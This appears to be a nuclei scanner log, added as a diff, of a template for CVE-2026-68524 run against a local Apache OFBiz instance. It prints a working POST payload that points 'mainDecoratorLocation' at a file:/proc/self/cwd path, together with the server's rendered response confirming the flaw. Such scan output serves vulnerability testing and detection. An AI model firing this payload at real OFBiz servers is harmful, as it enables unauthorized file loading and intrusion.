@@ -1,0 +1,183 @@
+[CVE-2026-68524:status-1] [http] [high] https://127.0.0.1:8443/webtools/control/main
+[CVE-2026-68524:word-2] [http] [high] https://127.0.0.1:8443/webtools/control/main
+
+                     __     _
+   ____  __  _______/ /__  (_)
+  / __ \/ / / / ___/ / _ \/ /
+ / / / / /_/ / /__/ /  __/ /
+/_/ /_/\__,_/\___/_/\___/_/   v3.11.1
+
+		projectdiscovery.io
+
+[ERR] Could not read nuclei-ignore file: open /root/.config/nuclei/.nuclei-ignore: no such file or directory
+[ERR] Could not read nuclei-ignore file: open /root/.config/nuclei/.nuclei-ignore: no such file or directory
+[INF] Current nuclei version: v3.11.1 (unknown) - remove '-duc' flag to enable update checks
+[INF] Current nuclei-templates version:  (unknown) - remove '-duc' flag to enable update checks
+[WRN] Scan results upload to cloud is disabled.
+[INF] New templates added in latest release: 0
+[INF] Templates loaded for current scan: 1
+[WRN] Loading 1 unsigned templates for scan. Use with caution.
+[INF] Targets loaded for current scan: 1
+[INF] [CVE-2026-68524] Dumped HTTP request for https://127.0.0.1:8443/webtools/control/main
+
+POST /webtools/control/main HTTP/1.1
+Host: 127.0.0.1:8443
+User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:52.0) Gecko/20100101 Firefox/52.0
+Content-Length: 91
+Content-Type: application/json
+Accept-Encoding: gzip
+
+{"mainDecoratorLocation":"file:/proc/self/cwd/framework/webtools/widget/CommonScreens.xml"}
+[DBG] [CVE-2026-68524] Dumped HTTP response https://127.0.0.1:8443/webtools/control/main
+
+HTTP/1.1 200
+Transfer-Encoding: chunked
+Cache-Control: Set-Cookie
+Content-Security-Policy-Report-Only: default-src 'self'
+Content-Type: text/html;charset=UTF-8
+Date: Thu, 05 Nov 2026 21:38:31 GMT
+Referrer-Policy: no-referrer-when-downgrade
+Set-Cookie: [REDACTED]
+Set-Cookie: [REDACTED]
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Vary: accept-encoding
+X-Content-Type-Options: nosniff
+X-Frame-Options: sameorigin
+X-Xss-Protection: 1; mode=block
+
+<!DOCTYPE html>
+<!-- Begin section widgetcomponent://webtools/widget/CommonScreens.xml#main id 836441df-a276-4e9b-a29c-2884a7fc5801 -->
+<!-- Begin section widgetfile:/proc/self/cwd/framework/webtools/widget/CommonScreens.xml#main-decorator id 8cd5cff1-d736-4e35-92dc-246e2087bb0f -->
+<!-- Begin section widgetcomponent://common/widget/CommonScreens.xml#GlobalDecorator id beb72c5b-0138-4684-b729-540f881a36db -->
+<!-- Begin section widgetcomponent://common/widget/CommonScreens.xml#GlobalActions id 236cdce0-21cf-46c9-b650-3e9fc24fa18a -->
+<!-- Begin section widgetcomponent://common/widget/CommonScreens.xml#MinimalActions id 11e63464-86ea-4572-8643-d454ad0318f3 -->
+<!-- End section Widget component://common/widget/CommonScreens.xml#MinimalActions id 11e63464-86ea-4572-8643-d454ad0318f3 -->
+<!-- Begin section widgetcomponent://common-theme/widget/CommonScreens.xml#GlobalActions id 2a51a341-345b-4892-928f-1166c5eed5db -->
+<!-- End section Widget component://common-theme/widget/CommonScreens.xml#GlobalActions id 2a51a341-345b-4892-928f-1166c5eed5db -->
+<!-- End section Widget component://common/widget/CommonScreens.xml#GlobalActions id 236cdce0-21cf-46c9-b650-3e9fc24fa18a -->
+<!-- Begin section widgetcomponent://common-theme/widget/CommonScreens.xml#GlobalDecorator id 86680720-d290-492e-b838-4221a86d46d1 -->
+<!-- Begin section widget -->
+<!-- End section Widget  -->
+<!-- Begin section widget -->
+<!-- Begin Template component://helveticus/template/includes/Header.ftl -->
+<html lang="en" dir="ltr" xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <title>OFBiz: Web Tools: Web Tools Main Page</title>
+    <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon">
+    <link rel="icon" href="/images/favicon.png" type="image/png">
+    <link rel="icon" sizes="32x32" href="/images/favicon-32.png" type="image/png">
+    <link rel="icon" sizes="64x64" href="/images/favicon-64.png" type="image/png">
+    <link rel="icon" sizes="96x96" href="/images/favicon-96.png" type="image/png">
+<link rel="stylesheet/less" href="/helveticus/HELVETICUS_EMERALD.less" type="text/css"/>
+        <script src="/common/js/node_modules/jquery/dist/jquery.min.js" type="application/javascript"></script>
+        <script src="/common/js/node_modules/jquery-migrate/dist/jquery-migrate.min.js" type="application/javascript"></script>
+        <script src="/common/js/node_modules/jquery.browser/dist/jquery.browser.min.js" type="application/javascript"></script>
+        <script src="/common/js/node_modules/jquery-ui-dist/jquery-ui.min.js" type="application/javascript"></script>
+        <script src="/common/js/node_modules/jquery-validation/dist/jquery.validate.min.js" type="application/javascript"></script>
+        <script src="/common/js/node_modules/dompurify/dist/purify.min.js" type="application/javascript"></script>
+        <script src="/common/js/node_modules/trumbowyg/dist/trumbowyg.min.js" type="application/javascript"></script>
+        <script src="/common/js/node_modules/trumbowyg/dist/plugins/indent/trumbowyg.indent.min.js" type="application/javascript"></script>
+        <script src="/common/js/util/OfbizUtil.js" type="application/javascript"></script>
+        <script src="/common/js/util/fieldlookup.js" type="application/javascript"></script>
+        <script src="/common/js/plugins/date/date.timezone-min.js" type="application/javascript"></script>
+        <script src="/common/js/util/miscAjaxFunctions.js" type="application/javascript"></script>
+        <script src="/common/js/util/selectMultipleRelatedValues.js" type="application/javascript"></script>
+        <script src="/common/js/util/util.js" type="application/javascript"></script>
+        <script src="/common/js/jquery/ui/js/jquery.cookie-1.4.0.js" type="application/javascript"></script>
+        <script src="/common/js/plugins/date/FromThruDateCheck.js" type="application/javascript"></script>
+        <script src="/common/js/util/application.js" type="application/javascript"></script>
+        <script src="/helveticus/js/less.min.js" type="application/javascript"></script>
+            <script src="/common/js/util/setUserTimeZone.js" type="application/javascript"></script>
+            <script src="/common/js/node_modules/jquery-validation/dist/localization/messages_en.js" type="application/javascript"></script>
+
+        <link rel="stylesheet" href="/common/js/node_modules/trumbowyg/dist/ui/trumbowyg.min.css" type="text/css"/>
+        <link rel="stylesheet" href="/common/js/jquery/plugins/jquery-jgrowl/jquery.jgrowl-1.4.6.min.css" type="text/css"/>
+        <link rel="stylesheet" href="/common/js/node_modules/jquery-ui-dist/jquery-ui.min.css" type="text/css"/>
+        <link rel="stylesheet" href="/common/css/info.css" type="text/css"/>
+        <link rel="stylesheet" href="/common/js/node_modules/trumbowyg/dist/ui/trumbowyg.min.css" type="text/css"/>
+        <link rel="stylesheet" href="/helveticus/flag-icon.min.css" type="text/css"/>
+        <link rel="stylesheet" href="/helveticus/javascript.css" type="text/css"/>
+        <link rel="stylesheet" href="/helveticus/style.css" type="text/css"/>
+</head>
+<!-- End Template component://helveticus/template/includes/Header.ftl -->
+<!-- Begin section widgetRender-Main-Nav -->
+<!-- Begin Template component://helveticus/template/includes/TopAppBar.ftl -->
+<body>
+
+<div id="wait-spinner" class="hidden">
+    <div id="wait-spinner-image"></div>
+</div>
+<div class="page-container">
+    <div class="hidden">
+        <a href="#column-container" title="Skip navigation" accesskey="2">
+        Skip navigation
+        </a>
+    </div>
+<!-- End Template component://helveticus/template/includes/TopAppBar.ftl -->
+<!-- End section Widget Render-Main-Nav -->
+<!-- End section Widget  -->
+<!-- Begin section widget -->
+<!-- Begin section widgetRender-App-Nav -->
+<!-- End section Widget Render-App-Nav -->
+<!-- End section Widget  -->
+<!-- Begin section widget -->
+<!-- End section Widget  -->
+<!-- Begin Template component://common-theme/template/includes/Messages.ftl -->
+<!-- End Template component://common-theme/template/includes/Messages.ftl -->
+<div class="contentarea">
+
+<div id="column-container">
+<!-- Begin section widget -->
+
+<div id="content-main-section">
+<!-- Begin Template component://webtools/template/Main.ftl -->
+<div class="screenlet">
+  <div class="screenlet-title-bar">
+    <ul>
+      <li class="h3">Web Tools Main Page</li>
+      <li class="disabled">Delegator Name: default</li>
+    </ul>
+    <br class="clear"/>
+  </div>
+  <div class="screenlet-body">
+      <div>For something interesting make sure you are logged in, try username: admin, password: ofbiz.</div>
+      <br />
+      <div>NOTE: If you have not already run the installation data loading script, from the ofbiz home directory run &quot;gradlew loadAll&quot; or &quot;java -jar build&#x2f;libs&#x2f;ofbiz.jar -l&quot;</div>
+      <br />
+      <div><a class="buttontext" href="https://127.0.0.1:8443/webtools/control/checkLogin">Login</a></div>
+  </div>
+</div>
+<!-- End Template component://webtools/template/Main.ftl -->
+ </div><!-- End section Widget  -->
+
+<div class="clear">
+ </div> </div> </div><!-- Begin section widget -->
+<!-- Begin section widgetRender-Footer -->
+<!-- Begin Template component://helveticus/template/includes/Footer.ftl -->
+<div id="footer-offset"></div>
+<div id="footer">
+    <span>11/5/26, 9:38 PM - <a href="https://127.0.0.1:8443/webtools/control/ListTimezones">Coordinated Universal Time</a></span>
+    <span>Copyright (c) 2001-2026
+        <a href="http://www.apache.org" target="_blank">The Apache Software Foundation</a>. Powered by
+        <a href="http://ofbiz.apache.org" target="_blank">Apache OFBiz.</a> Release
+24.09.07.
+revision: 42819e5ae1d5339d3a204ac06b43e69d46a9c0ae.
+built on: 2026-06-05T16:57:59.722Z.
+with java version:: Temurin-17.0.10+7
+    </span>
+</div>
+</div>
+    <script type="application/javascript" src="/helveticus/js/helveticus.js"></script>
+    <script type="application/javascript" src="/helveticus/js/OfbizUtil.js"></script>
+</body>
+</html>
+<!-- End Template component://helveticus/template/includes/Footer.ftl -->
+<!-- End section Widget Render-Footer -->
+<!-- End section Widget  -->
+<!-- End section Widget component://common-theme/widget/CommonScreens.xml#GlobalDecorator id 86680720-d290-492e-b838-4221a86d46d1 -->
+<!-- End section Widget component://common/widget/CommonScreens.xml#GlobalDecorator id beb72c5b-0138-4684-b729-540f881a36db -->
+<!-- End section Widget file:/proc/self/cwd/framework/webtools/widget/CommonScreens.xml#main-decorator id 8cd5cff1-d736-4e35-92dc-246e2087bb0f -->
+<!-- End section Widget component://webtools/widget/CommonScreens.xml#main id 836441df-a276-4e9b-a29c-2884a7fc5801 -->
+[INF] Scan completed in 48.766ms. 2 matches found.
+[INF] HTTP connections: 1 total, 1 new, 0 reused (0.0%)
